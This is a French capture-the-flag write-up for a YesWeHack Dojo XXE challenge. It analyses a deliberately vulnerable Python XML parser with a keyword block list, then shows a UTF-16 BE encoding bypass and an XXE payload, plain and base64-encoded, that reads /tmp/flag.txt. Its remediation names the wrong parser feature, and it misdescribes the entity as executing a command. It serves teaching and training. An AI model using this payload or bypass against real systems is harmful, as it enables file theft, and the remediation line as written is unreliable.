+++
author = "Chic0s"
title = "Dojo 34 - YesWeHack"
date = "2024-08-05"
description = "XXE - AI Image Generator"
tags = [
    "XXE",
]
categories = ["dojo"]
+++
Description
-----------

En cas de **XXE (XML External Entity)**, une vulnérabilité est exploitée dans le traitement XML pour insérer des entités externes malveillantes dans un document XML. Ce type de faille permet à un attaquant de lire des fichiers arbitraires sur le système, de scanner des ports, voire d'exécuter du code à distance. Dans le cadre de cette vulnérabilité, le point d'entrée identifié était la fonction _promptFromXML(data)_, où des entrées XML malveillantes pourraient être utilisées pour manipuler les paramètres de sécurité du serveur et potentiellement exécuter du code non autorisé sur le serveur web.

### Exploitation

#### Analyse du code

Dans un premier temps, une application permettant de générer des images est disponible. Cette application avait pour but de générer une image en fonction du prompt de l'utilisateur et de l'afficher via une page HTML.
La première phase est de passer en revu cette application sous **Python**.
Les 8 premières lignes nous donnent des indications sur les librairies utilisées pour développer l'application et les potentiels sécurités mise en place. De plus, l'application utilise un modèle nommé **index.tpl** qui se situe dans le répertoire **/tmp/templates** :
```python
    import os, io, base64, codecs, xml.sax
    from json import detect_encoding
    from urllib.parse import quote, unquote
    from jinja2 import Environment, FileSystemLoader
    template = Environment(
        autoescape=True,
        loader=FileSystemLoader('/tmp/templates'),
    ).get_template('index.tpl')
```
Les lignes suivantes fournissent une explication sur le traitement des données XML. Ce type de classe _XMLContentHandler_ est utilisé pour extraire le contenu des éléments XML :
```python
    class XMLContentHandler(xml.sax.ContentHandler):
        def __init__(self):
            self.content = ''
            self.current = ''

        def startElement(self, name, attrs):
            self.current = name

        def endElement(self, name):
            self.current = ''

        def characters(self, content):
            if self.current:
                self.content += content

        def get_text(self):
            return self.content
```
La partie suivante du code indique une fonction nommée **promptFromXML**. La fonction renvoie une chaine de caractères et prend comme paramètre une variable de nom s et de type string, correspondant au prompt de l'utilisateur :
```python
    def promptFromXML(s:str):
        dataBytes = base64.b64decode(s)

        if (dataBytes[:2] != b'\xff\xfe' and dataBytes[:2] != b'\xfe\xff'):
            #Allow parsing for casual svg
            if any(x in dataBytes.lower() for x in [b'file://', b'tmp', b'flag.txt', b'system', b'public', b'entity']):
                return 'BLOCKED'

        data = dataBytes.decode(detect_encoding(dataBytes))

        handler = XMLContentHandler()
        parser = xml.sax.make_parser()

        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        parser.setContentHandler(handler)

        parser.parse(io.StringIO(data))

        return handler.get_text()
```
Cette fonction agit comme un filtre sur les données envoyées par l'utilisateur :

*   _dataBytes = base64.b64decode(s)_ : la fonction prend la chaîne encodée en base64 et la décode en une séquence de bytes.

Par la suite, une vérification est effectuée :

*   La condition _if (DataBytes\[:2\] != b'\\xff\\xfe' and dataBytes\[:2\] != b\`\\xfe\\xff')_ détecte si les deux premiers octets de nos données sont différents de 'FF FE' et 'FE FF'.

*   La deuxième condition _if any(x in dataBytes.lower() for x in \[b'file://', b'tmp', b'flag.txt', b'system', b'public', b'entity'\])_ convertit toutes les lettres en majuscules de la variable **dataBytes** en minuscules. Dans un second temps, la condition parcourt nos données à la recherche des strings : 'file://', 'tmp', 'flag.txt', 'system', 'public', 'entity'. Si c'est le cas alors la fonction retourne '**BLOCKED**'.

*   Si la première condition n'est pas remplie, c'est-à-dire que les deux premiers octets de la séquence **dataBytes** ne soit pas égal à 'FF FE' et 'FE FF' ou que la première condition est remplie et non la deuxième condition alors :
    *   **dataBytes** est décodé en une chaine de caractères en utilisant l'encodage approprié grâce à la fonction _dataBytes.decode(detect\_encoding(dataBytes))_
    *   Le parseur SAX est initialisé et configuré pour traiter les entités externes. La gestion des entités externes est activée ce qui signifie que le parseur SAX peut inclure des entités externes dans le document XML.
    *   **dataBytes** peut être parser sous forme de document XML.
    *   Enfin, la fonction retourne le texte extrait du document XML.

Pour finir, voici la dernière partie du code :
```python
    data = unquote("")

    # Check if it's instruction in XML
    try:
        parsed_text = promptFromXML(data)

    except Exception as e:
        parsed_text = f'Your prompt to get this fancy image: {data}'

    print( template.render(output=parsed_text) )
```
La première ligne de ce code décode notre output grâce à la fonction _unquote()_.Exemple : « Hello%20Word%21 » devient « Hello Word! ».
La boucle **try** utilise la fonction détaillée précédemment : _promptFromXML()_ avec notre output **data**. Les données du return de la fonction _promptFromXML()_ sont stockées dans la variable **parsed\_text**.
En cas d'exception ou d'erreur la variable **parsed\_text** prend comme valeur '_Your prompt to get this fancy image : {data}_'. **{data}** est remplacée par notre input.
La dernière ligne du code remplace la valeur de '**output**' par celle de '**parsed\_text**' et affiche le contenu du template rendu.

#### Exploitation du code

Pour exploiter l'application, le but est de tenter de lire un fichier à l'aide d'un document XML.
Pour cela, la première étape est de fournir un payload encodé en **base64** et de ne pas remplir la première condition qui vérifie que les **deux premiers octets** de nos données sont différents de '**FF FE**' et '**FE FF**'. Les caractères hexadécimaux FF FE et FE FF correspondent à la marque d'ordre d'octet (BOM) de l'**UTF16 LE** et **BE**. Les données devront être encodé en UTF16 LE ou BE pour ne pas remplir la première condition et ne pas être soumis au filtrage de la deuxième condition.
La seconde étape est l'affichage d'un mot filtré afin de vérifier que la première condition n'est pas validée. Un commentaire a été fourni avec le code : _#Allow parsing for casual svg_
La charge utile sera une balise **svg** contenant une balise **text** :

    <svg version="1.1"><text>file://</text></svg>

On utilise CyberChef pour passer la payload en **UTF-16 BE** puis en **BASE64**. ([https://gchq.github.io/CyberChef)](https://gchq.github.io/CyberChef))

Ce qui donne :

    ADwAcwB2AGcAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4AMQAiAD4APAB0AGUAeAB0AD4AZgBpAGwAZQA6AC8ALwA8AC8AdABlAHgAdAA+ADwALwBzAHYAZwA+

![image.png](/images/1b7196fb-749b-466c-9e02-8e53d26fa6a2-YWH-FILE.jpg)  Premièrement, Le template affiche bien le texte **file://**. Deuxièmement, il est nécessaire d'afficher le fichier qui a pour chemin **/tmp/flag.txt**.

    <!DOCTYPE xxe [<!ENTITY flag SYSTEM "file:///tmp/flag.txt">]><svg version="1.1"><text>&flag;</text></svg>

Lien de la payload encodée avec Cyberchef : [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16BE%20(1201)')To_Base64('A-Za-z0-9%2B/%3D')&input=PCFET0NUWVBFIHh4ZSBbPCFFTlRJVFkgZmxhZyBTWVNURU0gImZpbGU6Ly8vdG1wL2ZsYWcudHh0Ij5dPjxzdmcgdmVyc2lvbj0iMS4xIj48dGV4dD4mZmxhZzs8L3RleHQ%2BPC9zdmc%2B)

La payload ci-dessus exécute via SYSTEM la commande file:///tmp/flag.txt et stock le résultat dans l'entité flag. Pour finir, on appelle l'entité **flag** afin d'afficher le contenu du fichier sous la forme de texte.
Il est désormais possible de lire le fichier.

### POC

Le flag sera affiché via la charge utile encodée suivante :

    ADwAIQBEAE8AQwBUAFkAUABFACAAeAB4AGUAIABbADwAIQBFAE4AVABJAFQAWQAgAGYAbABhAGcAIABTAFkAUwBUAEUATQAgACIAZgBpAGwAZQA6AC8ALwAvAHQAbQBwAC8AZgBsAGEAZwAuAHQAeAB0ACIAPgBdAD4APABzAHYAZwAgAHYAZQByAHMAaQBvAG4APQAiADEALgAxACIAPgA8AHQAZQB4AHQAPgAmAGYAbABhAGcAOwA8AC8AdABlAHgAdAA+ADwALwBzAHYAZwA+

![image.png](/images/e2890083-e759-458d-8fdf-ddbd523af83e-YWH-FLAG.jpg)

Le secret est **FLAG{Y0u\_Pwniied\_Th3\_AI!!}**.

### Au-delà du code

En examinant le template qui est exécuté avant chaque requête, on peut remarquer :

![image.png](/images/df8d812c-426d-446b-a3a5-da0e3ea483b7-YWH-TEMPLATE.jpg)

Si la valeur de **output** est égale à **BLOCKED** alors il affiche « _Are you trying to be evil with me!?_ ». Sinon la valeur de **output** est affichée.

### Les risques

Cette vulnérabilité pourrait permettre à un attaquant d'effectuer les actions suivantes :

*   Violation de la vie privée : Si une application Web gère des données personnelles ou sensibles, une vulnérabilité d'inclusion de fichier ou de traversée de chemin pourrait permettre à un attaquant d'accéder à ces informations et de les exploiter à des fins malveillantes, comme le vol d'identité ou la fraude.
*   Exécution de commande arbitraire : Si une application web présente une vulnérabilité liée aux entités externes malveillantes dans un document XML, un attaquant pourrait inclure du code malveillant et accéder à des fichiers sensibles tels que des fichiers de configuration, des bases de données ou des fichiers de mots de passe. De plus, l'attaquant peut prendre le contrôle du serveur conduisant à sa compromission.

Enfin, si une attaque réussie cela pourrait entraîner des interruptions de service ou des temps d'arrêt pénalisant les utilisateurs en affectant la disponibilité de l'application ou des services.

### Remédiation

Pour protéger une application web contre les attaques XXE, il est essentiel de désactivé la possibilité d'utiliser des entités externes dans le parseur XML : _parser.setFeature(xml.sax.handler.feature\_external\_pes, False)_

Cette modification désactive la possibilité de charger des entités externes et protège le serveur contre les attaques XXE.

### Les références

*   [https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/](https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/)
*   [https://mohemiv.com/all/evil-xml/](https://mohemiv.com/all/evil-xml/)
*   [https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
*   [https://cwe.mitre.org/data/definitions/611.html](https://cwe.mitre.org/data/definitions/611.html)
